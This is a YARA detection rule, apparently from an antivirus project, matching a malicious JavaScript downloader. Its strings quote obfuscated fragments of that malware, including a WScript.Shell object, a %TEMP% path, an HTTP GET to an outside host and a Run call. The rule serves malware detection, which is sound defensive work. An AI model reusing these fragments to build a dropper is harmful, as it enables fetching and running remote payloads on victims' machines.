rule sig_20160427_0deb5b48cb914ec64181672d06c86edb {
  meta:
    description = "datamaliciousorder - file 20160427_0deb5b48cb914ec64181672d06c86edb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d480f6b57ee39e90d080b0c29527d2521b9441c68d2803fee6d8e280353cf209"

  strings:
    $s1  = "function VcfoeZwtai() {return NtjctBxbov[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"aUtOxsH" ascii
    $s2  = "function VcfoeZwtai() {return NtjctBxbov[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"aUtOxsH" ascii
    $s3  = "var NtjctBxbov = function DucyeCxjlj() {return VpvovSlzsq[MwgjgTzpkw](\"WScript\"+\".Shell\");}(), NfxzlVuoql = 11;" fullword ascii
    $s4  = "function CnuiaFttga(OspsuZnpcd, UilnvJeylf){IwjclWgmbn = IwjclWgmbn * 1; return OspsuZnpcd - UilnvJeylf;};" fullword ascii
    $s5  = "EhwjaQquqy[MvcndNnssz](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var VpvovSlzsq = this[\"WScript\"];" fullword ascii
    $s7  = "if (EhwjaQquqy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GpjmgKxemq(){return ZiojtBglyn + \"\";};" fullword ascii
    $s9  = "function EdmwfOvypb() {return ((UdvfdJfive == true) && (UdvfdJfive == HilbyCltxp)) ? 1 : IwjclWgmbn;};" fullword ascii
    $s10 = "return CnuiaFttga(KskzoTupuk, WfagnHrndu);" fullword ascii
    $s11 = "var TwiccDhagp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "function LiyojUbaln(){return 23;};" fullword ascii
    $s13 = "function MhtqiNrbdp()" fullword ascii
    $s14 = "}while (DhoyhBnrnn);" fullword ascii
    $s15 = "UdvfdJfive = true; " fullword ascii
    $s16 = "function EhkcpVoqne(LipbeHijog){NtjctBxbov[\"R\"+\"un\"](LipbeHijog, IwjclWgmbn, IwjclWgmbn);};" fullword ascii
    $s17 = "var HilbyCltxp = false;" fullword ascii
    $s18 = "HilbyCltxp = true; " fullword ascii
    $s19 = "function NoearCcmgv(){return MwgjgTzpkw;};" fullword ascii
    $s20 = "var UdvfdJfive = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}